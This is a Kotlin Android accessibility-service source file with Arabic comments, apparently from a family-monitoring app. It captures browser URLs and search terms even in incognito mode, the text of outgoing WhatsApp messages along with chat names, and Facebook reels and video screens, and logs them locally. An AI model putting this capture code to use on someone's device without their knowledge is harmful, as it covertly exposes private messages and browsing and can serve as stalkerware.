package com.family.monitor

import android.accessibilityservice.AccessibilityService
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

/**
 * رصد التصفح والبحث من شريط العنوان في أي متصفح (الوضع العادي والخفي)
 * + رصد رسائل واتساب الصادرة (ضغط زر الإرسال).
 *
 * آلية عمل المتصفحات:
 *  1) عند أي تغيير نافذة/محتوى في متصفح: نؤجل القراءة 600 مللي (حتى يستقر شريط العنوان).
 *  2) نقرأ شجرة الواجهة ونبحث عن شريط العنوان نفسه (حقل url_bar في كروم، location_bar في سامسونج...).
 *  3) نتحقق أن النص رابط حقيقي أو نص بحث، ونستبعد صفحات النظام الداخلية (chrome:// ...).
 *  4) إذا كان رابط بحث (google/bing/...) نستخرج كلمة البحث من المعامل q ونحفظ الرابط معًا.
 *
 * آلية عمل واتساب (الصادرة):
 *  1) أثناء الكتابة نحفظ نص حقل الكتابة (TYPE_VIEW_TEXT_CHANGED).
 *  2) عند الضغط على زر «إرسال» (TYPE_VIEW_CLICKED ووصفه يحتوي إرسال/send)
 *     نسجل الرسالة كحدث صادر مع اسم المحادثة إن أمكن قراءته من شريط العنوان.
 */
class UrlAccessibilityService : AccessibilityService() {

    companion object {
        private val SEARCH_KEYS = listOf("q", "query", "search_query", "text", "wd", "k", "p", "s")
        private val SEARCH_HOSTS = listOf(
            "google.", "bing.com", "duckduckgo.com", "search.yahoo", "yandex.",
            "baidu.com", "ecosia.org", "startpage.com", "ask.com"
        )
        /** صفحات داخلية/ضوضاء لا تُسجل أبدًا */
        private val NOISE_PREFIXES = listOf(
            "chrome://", "about:", "edge://", "browser://", "chrome-native://",
            "javascript:", "data:", "file://", "content://", "view-source:",
            "intent:", "market://", "about:blank"
        )
        private val ADDRESS_ID_HINTS = listOf("url", "address", "location", "search_box", "searchbox", "omnibox")
        private val INCOGNITO_HINTS = listOf("incognito", "خفي", "تخفي", "private browsing", "تصفح خاص")

        // ---------- رصد الصادرة في واتساب ----------
        /** أوصاف زر الإرسال المعروفة (عربي/إنجليزي وكل نسخ واتساب) */
        private val SEND_HINTS = listOf("إرسال", "ارسال", "send", "إرسال الرسالة")
        /** معرفات واجهة واتساب التي تحمل اسم صاحب المحادثة */
        private val CHAT_NAME_ID_HINTS = listOf(
            "conversation_title", "conversation_contact", "toolbar_title", "contact_name", "chat_title"
        )

        private var lastUrl = ""
        private var lastAt = 0L

        // حالة الصادرة
        private var composingText = ""
        private var lastSentText = ""
        private var lastSentAt = 0L
        private var lastChatName = ""

        // حالة رصد شاشات فيسبوك (ريلز/فيديو/روابط داخلية)
        private var lastFbTitle = ""
        private var lastFbAt = 0L
    }

    private val handler = Handler(Looper.getMainLooper())
    private val capture = Runnable { doCapture() }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return
        // رسائل واتساب الصادرة (ضغط زر الإرسال) — تُرصد هنا لأنها لا تصدر إشعارًا
        if (Config.isWhatsApp(pkg)) {
            handleWhatsAppEvent(pkg, event)
            return
        }
        // شاشات فيسبوك: الريلز، مشاهدة فيديو، الروابط المفتوحة داخل متصفح فيسبوك
        if (Config.isFacebook(pkg)) {
            handleFacebookEvent(pkg, event)
            return
        }
        if (!Config.isBrowser(pkg)) return
        val t = event.eventType
        if (t != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            t != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) return

        // تأجيل القراءة حتى يستقر شريط العنوان (الكتابة الحرفية تُصدر عشرات الأحداث)
        handler.removeCallbacks(capture)
        handler.postDelayed(capture, 600)
    }

    // ---------- رصد رسائل واتساب الصادرة ----------

    private fun handleWhatsAppEvent(pkg: String, event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val src = event.source
                val isEdit = src?.isEditable == true ||
                    src?.className?.toString()?.contains("EditText", ignoreCase = true) == true ||
                    event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                if (!isEdit) return

                // source.text عادةً يحتوي النص الكامل للحقل، وليس الجزء الذي تغيّر فقط.
                val txt = src?.text?.toString() ?: event.text?.joinToString("") ?: ""
                if (txt.length <= 10_000) composingText = txt
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                if (!isWhatsAppSendAction(event)) return

                // نقرأ الحقل من الشاشة أيضًا؛ بعض إصدارات واتساب لا ترسل النص في event.source.
                val visibleText = readWhatsAppComposerText()
                val text = (visibleText.ifBlank { composingText }).trim()
                if (text.isEmpty()) {
                    composingText = ""
                    return
                }

                // بعض الإصدارات تطلق أكثر من حدث لنقرة الإرسال الواحدة.
                val now = System.currentTimeMillis()
                if (text == lastSentText && now - lastSentAt < 900L) return
                lastSentText = text
                lastSentAt = now

                readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }

                val json = JSONObject()
                    .put("type", "WHATSAPP")
                    .put("direction", "OUTGOING")
                    .put("title", lastChatName.ifBlank { "محادثة غير محددة" })
                    .put("app", whatsAppName(pkg))
                    .put("packageName", pkg)
                    .put("meta", JSONObject().put("text", text))
                EventStore.addEvent(applicationContext, json)
                composingText = ""
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                readChatName().takeIf { it.isNotBlank() }?.let { lastChatName = it }
                composingText = ""
            }
        }
    }

    /**
     * يتحقق من أن النقرة على زر الإرسال نفسه، باستخدام وصف العقدة أو معرّفها.
     * لا يعتمد على نص عام في الشاشة حتى لا يسجل نقرات أخرى كإرسال.
     */
    private fun isWhatsAppSendAction(event: AccessibilityEvent): Boolean {
        val direct = event.contentDescription?.toString().orEmpty()
        if (containsSendHint(direct)) return true

        val original = event.source
        var node: AccessibilityNodeInfo? = original
        var depth = 0
        while (node != null && depth < 4) {
            val description = node.contentDescription?.toString().orEmpty()
            val text = node.text?.toString().orEmpty()
            val viewId = node.viewIdResourceName?.lowercase().orEmpty()
            if (containsSendHint(description) || containsSendHint(text)) return true
            if (viewId.contains("send") || viewId.contains("send_button") ||
                viewId.contains("send_message")
            ) return true

            node = node.parent
            depth++
        }
        try { original?.recycle() } catch (_: Exception) {}
        return false
    }

    private fun containsSendHint(value: String): Boolean {
        if (value.isBlank() || value.length > 80) return false
        return SEND_HINTS.any { value.contains(it, ignoreCase = true) }
    }

    /** قراءة نص محرر الرسالة الظاهر حاليًا في محادثة واتساب. */
    private fun readWhatsAppComposerText(): String {
        try {
            val root = rootInActiveWindow ?: return ""
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            stack.add(root)
            var scanned = 0
            var best = ""
            var bestById = ""

            while (stack.isNotEmpty() && scanned < 500) {
                val node = stack.removeFirst()
                scanned++
                val cls = node.className?.toString().orEmpty()
                val id = node.viewIdResourceName?.lowercase().orEmpty()
                val value = node.text?.toString().orEmpty()
                val isEditor = node.isEditable || cls.contains("EditText", ignoreCase = true)

                if (isEditor && value.length <= 10_000) {
                    if (value.length > best.length) best = value
                    val looksLikeComposer = listOf(
                        "entry", "input", "message", "chat_input", "conversation"
                    ).any { id.contains(it) }
                    if (looksLikeComposer && value.length >= bestById.length) bestById = value
                }

                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { stack.add(it) }
                }
            }
            return bestById.ifBlank { best }
        } catch (_: Exception) {
            return ""
        }
    }

    /** محاولة قراءة اسم صاحب المحادثة من شريط العنوان في واتساب */
    private fun readChatName(): String {
        try {
            val root = rootInActiveWindow ?: return ""
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            stack.add(root)
            var n = 0
            while (stack.isNotEmpty() && n < 250) {
                val node = stack.removeFirst()
                n++
                val id = node.viewIdResourceName?.lowercase() ?: ""
                val cls = node.className?.toString() ?: ""
                val txt = node.text?.toString()?.trim() ?: ""
                if (txt.isNotBlank() && txt.length <= 60 && cls.contains("TextView") &&
                    CHAT_NAME_ID_HINTS.any { id.contains(it) }
                ) {
                    return txt
                }
                for (i in 0 until node.childCount) node.getChild(i)?.let { stack.add(it) }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun whatsAppName(pkg: String): String = when (pkg.lowercase()) {
        "com.whatsapp" -> "WhatsApp"
        "com.whatsapp.w4b" -> "WhatsApp Business"
        else -> if (pkg.contains("gb", true)) "GBWhatsApp" else "WhatsApp"
    }

    // ---------- رصد محتوى فيسبوك (ريلز/فيديو/روابط داخلية) ----------

    /**
     * من اسم نافذة التطبيق نعرف نوع الشاشة:
     *  - نشاط الريلز  ← «الريلز — فيسبوك»
     *  - نشاط فيديو/مشاهدة ← «مشاهدة فيديو — فيسبوك»
     *  - متصفح فيسبوك الداخلي ← عنوان الصفحة إن أمكن قراءته وإلا «رابط خارجي داخل فيسبوك»
     * الشاشات العادية (الرئيسية، الملف الشخصي...) لا تُسجل — موجودة أصلًا في تبويب «التطبيقات».
     * أما عنوان الفيديو/الريل نفسه فيُرصد من MediaWatcher (جلسات الوسائط).
     */
    private fun handleFacebookEvent(pkg: String, event: AccessibilityEvent) {
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val cls = event.className?.toString() ?: return
        val lower = cls.lowercase()

        val title: String
        val screen: String
        when {
            lower.contains("reel") -> { title = "الريلز — فيسبوك"; screen = "reels" }
            lower.contains("video") || lower.contains("watch") -> { title = "مشاهدة فيديو — فيسبوك"; screen = "video" }
            lower.contains("browser") || lower.contains("webview") -> {
                // متصفح فيسبوك الداخلي: عنوان الصفحة غالبًا أول نص في حدث النافذة
                val page = event.text?.firstOrNull { t -> !t.isNullOrBlank() && t.length <= 120 }?.toString()?.trim()
                title = if (!page.isNullOrEmpty()) page else "رابط خارجي داخل فيسبوك"
                screen = "link"
            }
            else -> return
        }
        if (title.length < 3) return

        val now = System.currentTimeMillis()
        if (title == lastFbTitle && now - lastFbAt < 30_000) return  // أحداث متتالية لنفس الشاشة
        lastFbTitle = title
        lastFbAt = now

        val json = org.json.JSONObject()
            .put("type", "MEDIA")
            .put("title", title.take(120))
            .put("app", fbName(pkg))
            .put("packageName", pkg)
            .put("meta", org.json.JSONObject().put("screen", screen))
        EventStore.addEvent(applicationContext, json)
    }

    private fun fbName(pkg: String): String = when (pkg.lowercase()) {
        "com.facebook.katana" -> "فيسبوك"
        "com.facebook.lite" -> "فيسبوك لايت"
        "com.facebook.orca" -> "ماسنجر"
        "com.facebook.mlite" -> "Messenger Lite"
        else -> "فيسبوك"
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun doCapture() {
        val pkg = rootInActiveWindow?.packageName?.toString() ?: return
        if (!Config.isBrowser(pkg)) return

        val incognito = windowHasIncognitoHint(pkg)
        val addressText = readAddressBar(pkg, rootInActiveWindow ?: return) ?: return
        val trimmed = addressText.trim()
        if (trimmed.isEmpty() || trimmed.length > 2000) return

        // استبعاد الضوضاء: صفحات النظام الداخلية لا تُسجل
        val lowered = trimmed.lowercase()
        if (NOISE_PREFIXES.any { lowered.startsWith(it) }) return

        val sameAsLast = trimmed == lastUrl
        if (sameAsLast && System.currentTimeMillis() - lastAt < 60_000) return

        val now = System.currentTimeMillis()
        lastUrl = trimmed
        lastAt = now

        val isUrl = lowered.startsWith("http") || Regex("^[\\w-]+(\\.[\\w-]+)+.*").matches(trimmed)
        val json = JSONObject().put("packageName", pkg).put("app", browserName(pkg))
        if (incognito) json.put("incognito", true)

        if (!isUrl) {
            // نص بحث مكتوب في شريط العنوان
            json.put("type", "SEARCH").put("title", trimmed).put("url", "")
        } else {
            val full = if (lowered.startsWith("http")) trimmed else "https://$trimmed"
            val uri = Uri.parse(full)
            val host = uri.host?.lowercase() ?: ""
            val isSearch = SEARCH_HOSTS.any { host.contains(it) }
            var q: String? = null
            for (k in SEARCH_KEYS) {
                q = uri.getQueryParameter(k)
                if (!q.isNullOrBlank()) break
            }
            if (isSearch && !q.isNullOrBlank()) {
                // بحث حقيقي: نحفظ كلمة البحث + الرابط (لفتحه بالضغط عليه)
                json.put("type", "SEARCH").put("title", q.trim()).put("url", full)
            } else {
                json.put("type", "BROWSER").put("title", host.removePrefix("www.")).put("url", full)
            }
        }

        EventStore.addEvent(applicationContext, json)
    }

    /** يقرأ نص شريط العنوان من شجرة الواجهة */
    private fun readAddressBar(pkg: String, root: AccessibilityNodeInfo): String? {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var scanned = 0
        var bestById: String? = null
        var bestGenericUrl: String? = null

        while (stack.isNotEmpty() && scanned < 400) {
            val node = stack.removeFirst()
            scanned++
            val text = node.text?.toString()?.trim()
            val viewId = node.viewIdResourceName?.lowercase() ?: ""

            if (!text.isNullOrBlank() && text.length <= 2000) {
                val looksAddress = ADDRESS_ID_HINTS.any { viewId.contains(it) && !viewId.contains("icon") && !viewId.contains("clear") }
                val looksUrl = Regex("^[\\w-]+(\\.[\\w-]+)+.*").matches(text) || text.startsWith("http", true)
                val isEditText = node.className?.toString()?.contains("EditText") == true

                if (looksAddress) {
                    // الأولوية القصوى: حقل شريط العنوان المعروف بالمعرّف
                    if (bestById == null || (isEditText && bestById != null)) bestById = text
                } else if (looksUrl && bestGenericUrl == null) {
                    bestGenericUrl = text
                }
            }

            if (node.isEditable && !text.isNullOrBlank() && bestById == null && looksLikeAddressField(node)) {
                bestById = text
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { stack.add(it) }
            }
        }
        return bestById ?: bestGenericUrl
    }

    private fun looksLikeAddressField(node: AccessibilityNodeInfo): Boolean {
        val id = node.viewIdResourceName?.lowercase() ?: ""
        return id.isNotEmpty() && ADDRESS_ID_HINTS.any { id.contains(it) }
    }

    private fun windowHasIncognitoHint(pkg: String): Boolean {
        try {
            val root = rootInActiveWindow ?: return false
            // فحص سريع لأول 60 عقدة فقط بحثًا عن كلمة التخفي
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            stack.add(root)
            var n = 0
            while (stack.isNotEmpty() && n < 60) {
                val node = stack.removeFirst()
                n++
                val txt = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
                if (INCOGNITO_HINTS.any { txt.contains(it, true) }) return true
                for (i in 0 until node.childCount) node.getChild(i)?.let { stack.add(it) }
            }
        } catch (_: Exception) {}
        return false
    }

    private fun browserName(pkg: String): String = when {
        pkg.contains("chrome") -> "Chrome"
        pkg == "com.sec.android.app.sbrowser" || pkg == "com.samsung.android.internet" -> "Samsung Internet"
        pkg.contains("firefox") || pkg.contains("focus") -> "Firefox"
        pkg.contains("emmx") -> "Edge"
        pkg.contains("opera") -> "Opera"
        pkg.contains("brave") -> "Brave"
        pkg.contains("UCMobile") || pkg.contains("uc.browser") -> "UC Browser"
        pkg.contains("duckduckgo") -> "DuckDuckGo"
        pkg.contains("googlequicksearchbox") || pkg.contains("searchlite") -> "بحث جوجل"
        pkg.contains("vivaldi") -> "Vivaldi"
        pkg.contains("kiwi") -> "Kiwi"
        pkg.contains("yandex") -> "Yandex"
        else -> pkg.substringAfterLast('.').ifBlank { "متصفح" }
    }
}
